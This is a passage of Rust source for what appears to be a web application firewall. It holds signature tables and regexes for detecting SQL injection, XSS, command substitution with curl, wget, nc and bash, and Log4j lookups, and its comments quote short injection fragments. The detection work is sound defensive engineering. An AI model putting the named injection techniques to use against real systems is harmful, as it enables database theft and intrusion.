        push(
            "SQL-018",
            AttackCategory::SqlInjection,
            4,
            "TRUNCATE TABLE",
            "truncate table",
        );
        push(
            "SQL-019",
            AttackCategory::SqlInjection,
            4,
            "exec xp_cmdshell",
            "xp_cmdshell",
        );
        // Oracle error-based injection helper — only ever appears inside an
        // exploit (utl_inaddr.get_host_name), critical at Normal.
        push(
            "SQL-020",
            AttackCategory::SqlInjection,
            5,
            "utl_inaddr error-based probe",
            "utl_inaddr",
        );
        // Postgres COPY ... TO PROGRAM — never a legitimate search phrase,
        // the quoted program name only occurs in an exfiltration statement.
        push(
            "SQL-021",
            AttackCategory::SqlInjection,
            5,
            "COPY TO PROGRAM exfiltration",
            "to program '",
        );
        // PortSwigger boolean-blind cast family: `SELECT CAST((SELECT …) AS
        // int)` exfiltrates through a type error; the nested cast-open-select
        // sequence never occurs in prose.
        push(
            "SQL-022",
            AttackCategory::SqlInjection,
            5,
            "nested CAST((SELECT exfiltration",
            "cast((select",
        );
        // Oracle XPATH error-based injection (extractvalue/xmltype) — the
        // function pair is exploit-specific.
        push(
            "SQL-023",
            AttackCategory::SqlInjection,
            5,
            "extractvalue XPATH error-based probe",
            "extractvalue(",
        );
        // Truncated-tautology tail: `' or 1 limit 1 --` closes a quote and
        // forces row truncation; bare prose never chains "or 1 limit".
        push(
            "SQL-024",
            AttackCategory::SqlInjection,
            5,
            "or-1-limit tautology truncation",
            "or 1 limit",
        );
        // Postgres/Windows lateral-movement probes read the filesystem or the
        // SMB stack through `master..xp_dirtree`; the token pair only occurs
        // inside live exploitation chains.
        push(
            "SQL-025",
            AttackCategory::SqlInjection,
            5,
            "xp_dirtree filesystem probe",
            "xp_dirtree",
        );
        push(
            "SQL-026",
            AttackCategory::SqlInjection,
            5,
            "Oracle dbms_pipe time-based blind",
            "dbms_pipe.receive_message",
        );
        // MySQL error-based exfiltration through the diagnostic XML
        // function; the call with a concat argument is the standard POC
        // core (Drupal form-array key injection and friends).
        push(
            "SQL-027",
            AttackCategory::SqlInjection,
            5,
            "updatexml error-based exfiltration",
            "updatexml(",
        );

        // ---- XSS (literal needles; detect_xss catches structured payloads) ----
        push("XSS-001", AttackCategory::Xss, 5, "<script tag", "<script");
        push(
            "XSS-002",
            AttackCategory::Xss,
            5,
            "</script tag",
            "</script",
        );
        push("XSS-003", AttackCategory::Xss, 4, "<iframe tag", "<iframe");
        push("XSS-004", AttackCategory::Xss, 4, "<object tag", "<object");
        push("XSS-005", AttackCategory::Xss, 4, "<embed tag", "<embed");
        push("XSS-006", AttackCategory::Xss, 4, "<svg tag", "<svg");
        push(
            "XSS-007",
            AttackCategory::Xss,
            5,
            "javascript: URI",
            "javascript:",
        );
        push(
            "XSS-008",
            AttackCategory::Xss,
            5,
            "vbscript: URI",
            "vbscript:",
        );
        push(
            "XSS-009",
            AttackCategory::Xss,
            4,
            "data:text/html URI",
            "data:text/html",
        );
        push(
            "XSS-010",
            AttackCategory::Xss,
            4,
            "onerror handler",
            "onerror=",
        );
        push(
            "XSS-011",
            AttackCategory::Xss,
            4,
            "onload handler",
            "onload=",
        );
        push(
            "XSS-012",
            AttackCategory::Xss,
            4,
            "onmouseover handler",
            "onmouseover=",
        );
        push(
            "XSS-013",
            AttackCategory::Xss,
            4,
            "onclick handler",
            "onclick=",
        );
        push(
            "XSS-014",
            AttackCategory::Xss,
            4,
            "onfocus handler",
            "onfocus=",
        );
        push(
            "XSS-015",
            AttackCategory::Xss,
            3,
            "document.cookie access",
            "document.cookie",
        );
        push(
            "XSS-016",
            AttackCategory::Xss,
            3,
            "window.location assignment",
            "window.location",
        );
        push(
            "XSS-017",
            AttackCategory::Xss,
            4,
            "CSS expression()",
            "expression(",
        );
        push("XSS-018", AttackCategory::Xss, 4, "eval() call", "eval(");
        push("XSS-019", AttackCategory::Xss, 3, "alert() call", "alert(");
        // Chained prototype traversal is the DOM-clobbering / client-side
        // gadget shape (`toString.constructor.prototype.toString=…`); plain
        // `.prototype` on its own is ordinary JS, the two-token chain is not.
        push(
            "XSS-020",
            AttackCategory::Xss,
            4,
            "constructor.prototype chain",
            "constructor.prototype",
        );
        // JSFuck alphabet (`+!![]`, `!+[]`): array-coercion arithmetic only
        // appears in self-obfuscating JS payloads.
        push(
            "XSS-021",
            AttackCategory::Xss,
            4,
            "JSFuck alphabet",
            "+!![]",
        );
    }

    // Stack scoping: deserialization and EL-lookup markers only matter to the
    // runtime that actually parses them. Engines built for a known stack set
    // drop the rest from the automaton; unconfigured deployments (stack set
    // `ALL`) keep everything.
    let stack_for = |id: &str| match id {
        "DZ-001" | "DZ-008" | "DZ-009" | "TI-006" => StackSet::JAVA,
        "DZ-002" | "DZ-004" | "DZ-011" | "TI-007" => StackSet::PYTHON,
        "DZ-005" | "DZ-006" | "DZ-007" | "DZ-010" => StackSet::PHP,
        "DZ-003" => StackSet::NODE,
        _ => StackSet::GENERIC,
    };
    for p in &mut v {
        p.stack = stack_for(p.id);
    }

    // Strict-only additions. These fire in environments where operators
    // explicitly chose coverage over noise: command-substitution starters
    // beyond the always-on `$(whoami)`/`$(id)` pair, and Log4j lookup
    // containers used by obfuscated Log4Shell variants.
    let mut push_strict = |id: &'static str,
                           cat: AttackCategory,
                           sev: u8,
                           stack: StackSet,
                           desc: &'static str,
                           needle: &'static str| {
        v.push(SignaturePattern {
            id,
            category: cat,
            severity: sev,
            stack,
            strict_only: true,
            description: desc,
            needle,
        });
    };
    push_strict(
        "CI-101",
        AttackCategory::CommandInjection,
        5,
        StackSet::GENERIC,
        "command substitution (cat)",
        "$(cat",
    );
    push_strict(
        "CI-102",
        AttackCategory::CommandInjection,
        5,
        StackSet::GENERIC,
        "command substitution (ping)",
        "$(ping",
    );
    push_strict(
        "CI-103",
        AttackCategory::CommandInjection,
        5,
        StackSet::GENERIC,
        "command substitution (curl)",
        "$(curl",
    );
    push_strict(
        "CI-104",
        AttackCategory::CommandInjection,
        5,
        StackSet::GENERIC,
        "command substitution (wget)",
        "$(wget",
    );
    push_strict(
        "CI-105",
        AttackCategory::CommandInjection,
        5,
        StackSet::GENERIC,
        "command substitution (netcat)",
        "$(nc",
    );
    push_strict(
        "CI-106",
        AttackCategory::CommandInjection,
        5,
        StackSet::GENERIC,
        "command substitution (bash)",
        "$(bash",
    );
    push_strict(
        "TI-101",
        AttackCategory::TemplateInjection,
        5,
        StackSet::JAVA,
        "Log4j case-normalization lookup",
        "${lower:",
    );
    push_strict(
        "TI-102",
        AttackCategory::TemplateInjection,
        5,
        StackSet::JAVA,
        "Log4j case-normalization lookup (upper)",
        "${upper:",
    );
    push_strict(
        "TI-103",
        AttackCategory::TemplateInjection,
        5,
        StackSet::JAVA,
        "Log4j environment lookup",
        "${env:",
    );
    push_strict(
        "TI-104",
        AttackCategory::TemplateInjection,
        5,
        StackSet::JAVA,
        "Log4j system-property lookup",
        "${sys:",
    );

    v
}

/// Aho-Corasick automaton over the built-in pattern table.
///
/// The engine holds only the patterns active for its profile (level × stack
/// set) and owns them as `Copy` structs — building one never allocates
/// pattern metadata, and a scan hit is a `u32` index resolved back through
/// [`SignatureEngine::pattern`].
pub struct SignatureEngine {
    aho: AhoCorasick,
    /// Active patterns in automaton-pattern-index order.
    patterns: Vec<SignaturePattern>,
}

impl fmt::Debug for SignatureEngine {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.debug_struct("SignatureEngine")
            .field("pattern_count", &self.patterns.len())
            .finish()
    }
}

impl Default for SignatureEngine {
    fn default() -> Self {
        Self::new()
    }
}

impl SignatureEngine {
    /// Build the engine with the full built-in pattern table at the Normal
    /// level. The automaton is constructed once and reused for every request.
    pub fn new() -> Self {
        Self::for_profile(WafLevel::Normal, StackSet::ALL)
    }

    /// Build an engine for a detection level plus backend-stack selection.
    /// Needles belonging to disabled stacks or to the Strict-only set are
    /// never registered in the automaton, so filtering them out saves work on
    /// every request rather than filtering hits afterwards.
    pub fn for_profile(level: WafLevel, stacks: StackSet) -> Self {
        let patterns: Vec<SignaturePattern> = builtin_patterns()
            .into_iter()
            .filter(|p| {
                (level.is_strict() || !p.strict_only)
                    && stacks.contains(p.stack)
            })
            .collect();
        let needles: Vec<&str> = patterns.iter().map(|p| p.needle).collect();
        let aho = AhoCorasickBuilder::new()
            // LeftmostLongest matters for needle sets with shared prefixes:
            // under the default Standard semantics the short `${` (TI-003)
            // wins the position and consumes it, so the critical `${jndi:`
            // (TI-006) Log4Shell needle can never fire on a real payload.
            // Longest-match keeps the high-signal needle authoritative.
            .match_kind(aho_corasick::MatchKind::LeftmostLongest)
            .ascii_case_insensitive(true)
            .build(&needles)
            .expect("aho-corasick build cannot fail with valid UTF-8 needles");
        Self { aho, patterns }
    }

    pub fn pattern_count(&self) -> usize {
        self.patterns.len()
    }

    /// Resolve an automaton pattern index to its static metadata.
    pub fn pattern(&self, idx: u32) -> &SignaturePattern {
        &self.patterns[idx as usize]
    }

    pub fn pattern_id(&self, idx: u32) -> &str {
        self.pattern(idx).id
    }

    /// Scan `haystack` into caller-owned buffers, clearing them first. Hot
    /// paths reuse one `hits`/`seen` pair across every value of a request, so
    /// scanning a full request costs a single heap allocation instead of one
    /// per field. Results are de-duplicated by pattern so a payload repeating
    /// the same needle doesn't multiply the score.
    pub fn scan_into(
        &self,
        haystack: &str,
        hits: &mut Vec<SignatureHit>,
        seen: &mut Vec<u32>,
    ) {
        hits.clear();
        seen.clear();
        if haystack.is_empty() {
            return;
        }
        for m in self.aho.find_iter(haystack) {
            let pid = m.pattern().as_u32();
            if seen.contains(&pid) {
                continue;
            }
            seen.push(pid);
            let p = &self.patterns[pid as usize];
            hits.push(SignatureHit {
                pattern: pid,
                category: p.category,
                severity: p.severity,
                offset: m.start(),
                length: m.end() - m.start(),
            });
        }
    }

    /// Scan `haystack` and return every signature that fired.
    pub fn scan(&self, haystack: &str) -> Vec<SignatureHit> {
        let mut hits = Vec::new();
        self.scan_into(haystack, &mut hits, &mut Vec::new());
        hits
    }

    /// Convenience: scan and return only the highest severity hit.
    pub fn scan_top(&self, haystack: &str) -> Option<SignatureHit> {
        self.scan(haystack).into_iter().max_by_key(|h| h.severity)
    }
}

// ---------------------------------------------------------------------------
// libinjection-style SQLi detection
// ---------------------------------------------------------------------------

/// SQL keywords we recognize when fingerprinting input.
const SQL_KEYWORDS: &[&str] = &[
    "select",
    "union",
    "all",
    "distinct",
    "from",
    "where",
    "and",
    "or",
    "not",
    "in",
    "like",
    "between",
    "is",
    "null",
    "having",
    "group",
    "order",
    "by",
    "limit",
    "offset",
    "asc",
    "desc",
    "insert",
    "into",
    "values",
    "update",
    "set",
    "delete",
    "drop",
    "alter",
    "create",
    "truncate",
    "table",
    "database",
    "schema",
    "user",
    "version",
    "current_user",
    "session_user",
    "join",
    "inner",
    "left",
    "right",
    "outer",
    "on",
    "as",
    "case",
    "when",
    "then",
    "else",
    "end",
    "exists",
    "any",
    "some",
    "with",
    "recursive",
    "cast",
    "convert",
    "exec",
    "execute",
    "begin",
    "commit",
    "rollback",
    "savepoint",
    "grant",
    "revoke",
    "show",
    "describe",
    "true",
    "false",
];

/// SQL functions that are strong attack indicators on their own.
const SQL_FUNCTIONS: &[&str] = &[
    "sleep",
    "benchmark",
    "waitfor",
    "delay",
    "pg_sleep",
    "load_file",
    "outfile",
    "dumpfile",
    "extractvalue",
    "updatexml",
    "concat",
    "concat_ws",
    "group_concat",
    "char",
    "ascii",
    "ord",
    "hex",
    "unhex",
    "substring",
    "substr",
    "mid",
    "left",
    "right",
    "length",
    "count",
    "sum",
    "avg",
    "min",
    "max",
    "rand",
    "floor",
    "ceil",
    "round",
    "if",
    "ifnull",
    "nullif",
    "coalesce",
    "version",
    "user",
    "database",
    "schema",
    "current_user",
    "session_user",
    "system_user",
    "row_number",
    "rank",
    "dense_rank",
    "xp_cmdshell",
    "sp_executesql",
    "make_set",
    "elt",
    "find_in_set",
    "regexp",
    "rlike",
];

/// Token kinds used to build the SQL fingerprint. Only word-like tokens go
/// through this enum; punctuation, numbers, strings, comments and variables
/// are emitted as raw fingerprint chars directly by [`fingerprint_sql`].
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum SqlTok {
    Keyword,  // k
    Function, // f
    Operator, // t  (logical: AND/OR/XOR/||/&&)
    Ident,    // n
}

impl SqlTok {
    fn fp_char(self) -> char {
        match self {
            SqlTok::Keyword => 'k',
            SqlTok::Function => 'f',
            SqlTok::Operator => 't',
            SqlTok::Ident => 'n',
        }
    }
}

/// Tokenize `lower` (assumed already lower-cased ASCII) into a SQL fingerprint
/// string. The fingerprint mirrors libinjection's single-char-per-token form.
fn fingerprint_sql(lower: &str) -> String {
    let bytes = lower.as_bytes();
    let mut fp = String::with_capacity(bytes.len() / 2 + 4);
    let mut i = 0usize;
    while i < bytes.len() {
        let b = bytes[i];
        match b {
            b' ' | b'\t' | b'\n' | b'\r' => i += 1,
            b'\'' | b'"' | b'`' => {
                // String literal: consume until matching quote (allowing backslash escapes).
                let quote = b;
                let mut j = i + 1;
                while j < bytes.len() {
                    if bytes[j] == b'\\' {
                        j += 2;
                        continue;
                    }
                    if bytes[j] == quote {
                        // SQL doubled-quote escape: '' inside a '...' string.
                        if j + 1 < bytes.len() && bytes[j + 1] == quote {
                            j += 2;
                            continue;
                        }
                        break;
                    }
                    j += 1;
                }
                fp.push(if quote == b'`' { 'n' } else { 's' });
                i = (j + 1).min(bytes.len());
            },
            b'-' if i + 1 < bytes.len() && bytes[i + 1] == b'-' => {
                fp.push('-');
                i = bytes.len(); // rest is comment
            },
            b'#' => {
                fp.push('-');
                i = bytes.len();
            },
            b'/' if i + 1 < bytes.len() && bytes[i + 1] == b'*' => {
                fp.push('-');
                // Skip until */
                let mut j = i + 2;
                while j + 1 < bytes.len()
                    && !(bytes[j] == b'*' && bytes[j + 1] == b'/')
                {
                    j += 1;
                }
                i = (j + 2).min(bytes.len());
            },
            b'(' => {
                fp.push('(');
                i += 1;
            },
            b')' => {
                fp.push(')');
                i += 1;
            },
            b',' => {
                fp.push(',');
                i += 1;
            },
            b';' => {
                fp.push(';');
                i += 1;
            },
            b'=' | b'<' | b'>' | b'!' => {
                fp.push('o');
                // Consume multi-char operators (<=, !=, <>, ==).
                let mut j = i + 1;
                while j < bytes.len()
                    && matches!(bytes[j], b'=' | b'<' | b'>' | b'!')
                {
                    j += 1;
                }
                i = j;
            },
            b'+' | b'-' | b'*' | b'/' | b'%' => {
                fp.push('o');
                i += 1;
            },
            b'|' if i + 1 < bytes.len() && bytes[i + 1] == b'|' => {
                fp.push('t');
                i += 2;
            },
            b'&' if i + 1 < bytes.len() && bytes[i + 1] == b'&' => {
                fp.push('t');
                i += 2;
            },
            b'|' | b'&' | b'^' | b'~' => {
                fp.push('o');
                i += 1;
            },
            b'@' => {
                fp.push('v');
                i += 1;
                while i < bytes.len()
                    && (bytes[i].is_ascii_alphanumeric()
                        || bytes[i] == b'_'
                        || bytes[i] == b'@')
                {
                    i += 1;
                }
            },
            b':' if i + 1 < bytes.len()
                && bytes[i + 1].is_ascii_alphabetic() =>
            {
                fp.push('v');
                i += 1;
                while i < bytes.len()
                    && (bytes[i].is_ascii_alphanumeric() || bytes[i] == b'_')
                {
                    i += 1;
                }
            },
            b if b.is_ascii_digit() => {
                while i < bytes.len()
                    && (bytes[i].is_ascii_digit()
                        || bytes[i] == b'.'
                        || bytes[i] == b'e'
                        || bytes[i] == b'E'
                        || bytes[i] == b'x'
                        || bytes[i] == b'X')
                {
                    i += 1;
                }
                fp.push('1');
            },
            b if b.is_ascii_alphabetic() || b == b'_' => {
                let start = i;
                while i < bytes.len()
                    && (bytes[i].is_ascii_alphanumeric() || bytes[i] == b'_')
                {
                    i += 1;
                }
                let word = &lower[start..i];
                let tok = if SQL_FUNCTIONS.contains(&word) {
                    SqlTok::Function
                } else if matches!(word, "and" | "or" | "xor") {
                    SqlTok::Operator
                } else if SQL_KEYWORDS.contains(&word) {
                    SqlTok::Keyword
                } else {
                    SqlTok::Ident
                };
                fp.push(tok.fp_char());
            },
            _ => i += 1,
        }
    }
    fp
}

/// Regex set used to confirm SQLi beyond the fingerprint.
static SQLI_UNION_SELECT: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)\bunion\b[\s/*!]+(?:\ball\b[\s/*!]+)?\bselect\b").unwrap()
});
/// Comment-glued union/select split: `unION#filler\nselECT`,
/// `union--filler\nselect`. The `#`/`--` must sit *glued* to `union` —
/// honest prose and teaching SQL always keep whitespace before a comment, so
/// the glued shape is authored obfuscation — and `select` must appear within
/// 64 filler bytes. The right edge accepts a digit or any non-letter
/// (`select1`) because attacker-controlled newline deletion glues the
/// keyword to the following token; `selection` still cannot fire.
static SQLI_UNION_COMMENT_SPLIT: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)\bunion(?:#|--)[\s\S]{0,64}?\bselect(?:[^a-z]|$)").unwrap()
});
static SQLI_STACKED: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i);\s*(?:select|insert|update|delete|drop|alter|create|truncate|exec|execute|grant|revoke|declare|begin|shutdown)\b").unwrap()
});
static SQLI_DANGEROUS_FN: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)\b(?:sleep|benchmark|pg_sleep|waitfor|load_file|extractvalue|updatexml|xp_cmdshell|sp_executesql)\s*\(").unwrap()
});
// T-SQL `WAITFOR` is a standalone statement keyword — `WAITFOR DELAY '0:05'`
// is never followed by `(`, so the function-call regex above cannot see real
// time-blindness payloads (`));wAITfor` in a transport-wrapped value).
// Bare `waitfor` inside an HTTP surface has no honest prose use and the
// keyword prefilter already bounds the cost to inputs mentioning it.
static SQLI_WAITFOR: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"(?i)\bwaitfor\b").unwrap());
static SQLI_TAUTOLOGY: Lazy<Regex> = Lazy::new(|| {
    // Tautology shapes only: numeric self-equality (`or 1=1`, `1='1'`),
    // quoted-token equality (`or 'a'='a'`, `"1"="1"`) and the classic blind
    // inequalities. A generic `word = string` comparison — Lucene/API filter
    // syntax like `author=="CT Stack"` or `title="sql" && product="x"` — is
    // not an injection signal.
    Regex::new(
        r#"(?i)(?:\bor\b|\band\b|\|\||&&)\s*(?:['"`][\w.\- ]{0,32}['"`]\s*=\s*['"`][\w.\- ]{0,32}['"`]?|['"`]?\d+['"`]?\s*=\s*['"`]?\d+['"`]?|\b1\s*<>\s*0\b|\b1\s*>\s*0\b)"#,
    )
    .unwrap()
});
static SQLI_COMMENT_TERM: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"(?:--\s|--$|#\s|#$|/\*[\s\S]*?\*/)").unwrap());
static SQLI_QUOTE_KEYWORD: Lazy<Regex> = Lazy::new(|| {
    // Quote immediately followed by a *SQL-specific* keyword (whitespace,
    // a stray `)`/`;` between them is allowed) — the `') union` / `'; drop`
    // quote-break family. `or`/`and` are deliberately excluded (prose) and
    // the keyword must sit directly behind the quote: an apostrophe inside
    // a word ("couldn't select a favorite") or a quote whose keyword appears
    // much later in a long word list must not fire.
    Regex::new(
        r#"(?i)['"][\s);]{0,4}\b(?:union|select|insert|update|delete|drop|alter|create|truncate|exec|execute)\b"#,
    )
    .unwrap()
});
static SQLI_INFO_SCHEMA: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)information_schema|\bsqlite_master\b|\bpg_catalog\b|\bsysobjects\b|\bsyscolumns\b").unwrap()
});
static SQLI_INTO_FILE: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"(?i)\binto\s+(?:out|dump)file\b").unwrap());
// Bare statement shape without a quote break: `SELECT * FROM all_tables`,
// `SELECT id,name FROM users`. The column list must carry statement markers
// (a star or a comma list) so prose like "select a gift from our store"
// cannot fire, and a *complete* query (WHERE/GROUP BY/ORDER BY/LIMIT/…)
// passed as a parameter is treated as the legitimate-query class and skipped
// — lexically indistinguishable, same tradeoff as the prose union-select pin.
static SQLI_BARE_SELECT: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)\bselect\s+(?:\*|\w+\s*,\s*[\w.\'"()]+\s*(?:,\s*[\w.\'"()]+)*)\s+from\s+[\w."']"#)
        .unwrap()
});
static SQLI_FULL_QUERY_CLAUSE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r"(?i)\b(?:where|group\s+by|order\s+by|having|limit|offset|join)\b",
    )
    .unwrap()
});
// Blind-probe dictionary shapes: `SELECT CASE WHEN (…) THEN …`, Oracle error
// probing `TO_CHAR(1/0)`, and the generic CASE…WHEN…THEN skeleton behind an
// SQL operator (`select/and/or/||/;/quote/(` prefix). The operator prefix
// keeps prose like "in the case when you feel chest pain … then" clean.
static SQLI_BLIND_PROBE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)\bselect\s+case\s+when\b|(?:\bselect\b|\b(?:and|or)\b|\|\||;|['"`(])\s*case\s+when\b[\s\S]{0,80}\bthen\b|\bto_char\s*\(\s*[\w'"]+\s*/\s*[\w'"]+\s*\)"#,
    )
    .unwrap()
});
// Quote-unbalanced tautology tail: `1' or ''=`, `1' or ''='` — the value was
// truncated mid-injection but the tautology attempt is explicit. Innocent
// prose does not end in `or '<empty>=`.
static SQLI_TRUNCATED_TAUTOLOGY: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)(?:\bor\b|\band\b|\|\|)\s*['"`]{1,2}\s*=\s*['"`]{0,2}\s*(?:--|#)?\s*$"#)
        .unwrap()
});
// Inline SQL comments used as keyword splitter: `OR/**/"1"="1"`.
static SQLI_INLINE_COMMENT: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"/\*[\s\S]*?\*/").unwrap());
// Boolean-context subquery — PortSwigger-style blind SQLi:
// `and (select …)='a'`, `or 1=(select cast((select …) as int))--`,
// `where 1=(select 'secret')`. An operator-prefixed subquery or a bare
// `N=(SELECT` comparison never occurs in prose; `and select`/`or select`
// alone is deliberately NOT matched (ordinary prose imperative).
static SQLI_BOOL_SUBQUERY: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)\b(?:and|or)\b\s*(?:\(\s*select\b|\d+\s*=\s*(?:\(\s*)?(?:cast\s*\(\s*\(?\s*)?select\b)|\b\d+\s*=\s*\(\s*select\b"#,
    )
    .unwrap()
});

/// Needles for the SQLi prefilter. Every input that matches one of the
/// strong regexes above contains at least one of these substrings
/// (ASCII case-insensitively), so an automaton miss proves the input is
/// clean and the expensive path can be skipped.
static SQLI_PREFILTER_NEEDLES: &[&str] = &[
    "or",
    "and",
    "||",
    "&&",
    "union",
    "select",
    "insert",
    "update",
    "delete",
    "drop",
    "alter",
    "create",
    "truncate",
    "exec",
    "grant",
    "revoke",
    "declare",
    "begin",
    "shutdown",
    "sleep",
    "benchmark",
    "waitfor",
    "load_file",
    "extractvalue",
    "updatexml",
    "xp_cmdshell",
    "sp_executesql",
    "information_schema",
    "sqlite_master",
    "pg_catalog",
    "sysobjects",
    "syscolumns",
    "into",
    "case",
    "to_char",
];

static SQLI_PREFILTER: Lazy<AhoCorasick> = Lazy::new(|| {
    AhoCorasickBuilder::new()
        .ascii_case_insensitive(true)
        .build(SQLI_PREFILTER_NEEDLES)
        .expect("aho-corasick build cannot fail with valid UTF-8 needles")
});

/// Strong (block-worthy) SQLi checks, run against lowercased text. Shared by
/// the direct pass and the comment-stripped rescan (`OR/**/"1"="1"`).
fn sqli_strong_checks(lower: &str) -> Vec<&'static str> {
    let mut strong: Vec<&'static str> = Vec::with_capacity(4);
    if SQLI_UNION_SELECT.is_match(lower) {
        strong.push("union-select");
    }
    // `unION#filler\nselECT` / `union--filler select`: a row comment glued
    // straight onto `union` with `select` behind the filler words. Honest SQL
    // prose keeps whitespace between the keyword and a comment, so the glued
    // shape is authored obfuscation — and the filler-bounded window keeps a
    // plain "union … select" mention (no comment) out of this check.
    if SQLI_UNION_COMMENT_SPLIT.is_match(lower) {
        strong.push("union-comment-split");
    }
    if SQLI_STACKED.is_match(lower) {
        strong.push("stacked-query");
    }
    if SQLI_DANGEROUS_FN.is_match(lower) {
        strong.push("dangerous-function");
    }
    if SQLI_WAITFOR.is_match(lower) {
        strong.push("waitfor-statement");
    }
    if SQLI_TAUTOLOGY.is_match(lower) {
        strong.push("tautology");
    }
    if SQLI_TRUNCATED_TAUTOLOGY.is_match(lower) {
        strong.push("truncated-tautology");
    }
    if SQLI_QUOTE_KEYWORD.is_match(lower) {
        strong.push("quote-keyword");
    }
    if SQLI_BARE_SELECT.is_match(lower)
        && !SQLI_FULL_QUERY_CLAUSE.is_match(lower)
    {
        strong.push("bare-select");
    }
    if SQLI_BLIND_PROBE.is_match(lower) {
        strong.push("blind-probe");
    }
    if SQLI_BOOL_SUBQUERY.is_match(lower) {
        strong.push("bool-subquery");
    }
    if SQLI_INFO_SCHEMA.is_match(lower) {
        strong.push("info-schema");
    }
    if SQLI_INTO_FILE.is_match(lower) {
        strong.push("into-file");
    }
    strong
}

/// Detect SQL injection using token fingerprinting plus targeted regex checks.
///
/// Returns `(is_sqli, fingerprint)`. The fingerprint encodes the
/// libinjection-style token signature followed by the names of every check
/// that fired. Only *strong* signals (structural SQL syntax) flip `is_sqli`;
/// weak signals such as a trailing comment are recorded in the fingerprint
/// but never block a request on their own, which keeps prose like
/// `"C# programming"` or `"well--done"` from tripping the detector.
///
/// Inputs rejected by the keyword prefilter return an empty fingerprint;
/// callers only inspect the fingerprint when `is_sqli` is true.
pub fn detect_sqli(input: &str) -> (bool, String) {
    if input.len() < 3 {
        return (false, String::new());
    }
    // `is_ascii` keeps the prefilter exact: the regexes use Unicode case
    // folding, which matches code points the ASCII-folded automaton misses
    // (e.g. the long-s `ſ`), so non-ASCII input always takes the full path.
    if input.is_ascii() && !SQLI_PREFILTER.is_match(input) {
        return (false, String::new());
    }
    let lower = input.to_ascii_lowercase();
    let fp = fingerprint_sql(&lower);

    let mut strong = sqli_strong_checks(&lower);
    let mut weak: Vec<&'static str> = Vec::with_capacity(2);

    // Comment-split injection (`OR/**/"1"="1"`): when the raw text carries an
    // inline SQL comment and nothing fired, re-run the strong checks on the
    // comment-stripped text. The prefilter already guaranteed an interesting
    // keyword, so this only runs on inputs the first pass could not confirm.
    if strong.is_empty() && lower.contains("/*") && lower.contains("*/") {
        let stripped = SQLI_INLINE_COMMENT.replace_all(&lower, " ");
        strong = sqli_strong_checks(&stripped);
        if !strong.is_empty() {
            strong.push("comment-stripped");
        }
    }

    if SQLI_COMMENT_TERM.is_match(&lower) {
        weak.push("comment-terminator");
    }

    // Fingerprint-shape heuristics. These are recorded as weak signals: the
    // regexes above already cover the high-confidence cases, and shapes like
    // `;k` can occur in innocent text ("items; select your favourite").
    if fp.starts_with('s') && fp.contains("to") {
        weak.push("string-tautology");
    }
    if fp.contains(";k") {
        weak.push("stacked-shape");
    }
    if fp.contains("kf")
        && fp.contains('(')
        && SQL_FUNCTIONS.iter().any(|f| lower.contains(*f))
    {
        weak.push("fn-call-shape");
    }

    let is_sqli = !strong.is_empty();
    let fingerprint = if strong.is_empty() && weak.is_empty() {
        fp
    } else {
        let mut all = strong;
        all.extend_from_slice(&weak);
        format!("{}|{}", fp, all.join(","))
    };
    (is_sqli, fingerprint)
}

// ---------------------------------------------------------------------------
// libinjection-style XSS detection
// ---------------------------------------------------------------------------

static XSS_SCRIPT_TAG: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"(?i)<\s*/?\s*script\b").unwrap());
// Event handler opener. The `\s` arm matches real markup (` on…=`); the
// `+` arm covers URL-encoded headers/paths where the space stayed literal
// (`<xss+onafterscriptexecute=…>` in a Referer query) — browsers reflect
// query strings with `+` for space into Referer URLs verbatim.
static XSS_EVENT_HANDLER: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"(?i)(?:\s|\+)on[a-z]+\s*=").unwrap());
static XSS_JS_URI: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)\b(?:javascript|vbscript|livescript|mocha)\s*:").unwrap()
});
static XSS_DANGEROUS_TAG: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)<\s*(?:iframe|object|embed|svg|math|form|input|body|frame|frameset|applet|meta|link|base|style|marquee|details|audio|video|template|portal)\b").unwrap()
});
static XSS_DATA_URI: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"(?i)data\s*:\s*(?:text/html|application/xhtml|text/javascript|application/javascript)").unwrap()
});
static XSS_STYLE_EXPR: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)expression\s*\(|url\s*\(\s*['\"]?\s*javascript"#).unwrap()
});
static XSS_HTML_COMMENT_BREAK: Lazy<Regex> = Lazy::new(|| {
    // `</style>`, `</title>`, `</textarea>` used to escape an HTML context.
    Regex::new(r"(?i)<\s*/\s*(?:style|title|textarea|noscript|comment)\b")
        .unwrap()
});
static XSS_DOM_CHAIN: Lazy<Regex> = Lazy::new(|| {
    // Prototype-gadget traversal: `ctor.prototype…`, `ctor.constructor(…)`,
    // `ctor["constructor"]` — chains used to reach Function/eval from an
    // ordinary object. A single `x.constructor.name` read is not a chain.
    Regex::new(
        r#"(?i)constructor\s*(?:\.\s*prototype|\.\s*constructor|\[\s*['"]constructor|\[\s*['"]prototype)"#,
    )
    .unwrap()
});

/// Needles for the XSS prefilter, with the same guarantee as the SQLi set:
/// every input matching one of the XSS regexes above contains at least one
/// of these substrings.
static XSS_PREFILTER_NEEDLES: &[&str] = &[
    "<",
    "on",
    "javascript",
    "vbscript",
    "livescript",
    "mocha",
    "data",
    "expression",
    "url",
    "constructor",
];

static XSS_PREFILTER: Lazy<AhoCorasick> = Lazy::new(|| {
    AhoCorasickBuilder::new()
        .ascii_case_insensitive(true)
        .build(XSS_PREFILTER_NEEDLES)
